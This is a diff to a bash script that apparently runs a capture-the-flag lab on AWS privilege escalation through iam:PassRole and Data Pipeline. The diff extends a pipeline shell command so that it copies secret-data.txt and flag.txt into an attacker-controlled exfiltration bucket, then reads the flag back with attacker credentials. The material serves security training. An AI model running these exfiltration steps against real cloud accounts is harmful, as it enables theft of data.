@@ -238,7 +238,7 @@ cat > /tmp/pipeline_definition.json << EOF
       "id": "ExfilActivity",
       "name": "ExfilActivity",
       "type": "ShellCommandActivity",
-      "command": "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION",
+      "command": "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION && aws s3 cp s3://$SENSITIVE_BUCKET/flag.txt s3://$EXFIL_BUCKET/flag.txt --region $AWS_REGION",
       "runsOn": {
         "ref": "ExfilResource"
       }
@@ -359,6 +359,24 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 13: Capture the CTF flag
+echo -e "${YELLOW}Step 13: Capturing CTF flag from exfil bucket${NC}"
+use_attacker_creds
+export AWS_REGION=$AWS_REGION
+echo "Retrieving flag.txt from attacker-controlled exfil bucket..."
+echo ""
+
+show_attack_cmd "$IDENTITY_LABEL" "aws s3 cp s3://$EXFIL_BUCKET/flag.txt - --region $AWS_REGION"
+FLAG_VALUE=$(aws s3 cp s3://$EXFIL_BUCKET/flag.txt - --region $AWS_REGION 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from s3://$EXFIL_BUCKET/flag.txt${NC}"
+    echo "The pipeline may still be copying flag.txt. Check back in a minute."
+fi
+echo ""
+
 # Clean up temporary files
 rm -f /tmp/pipeline_definition.json /tmp/pipeline_put_result.json
 
@@ -367,7 +385,7 @@ rm -f /tmp/pipeline_definition.json /tmp/pipeline_put_result.json
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ DATA EXFILTRATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ DATA EXFILTRATION SUCCESSFUL + CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole and Data Pipeline permissions)"
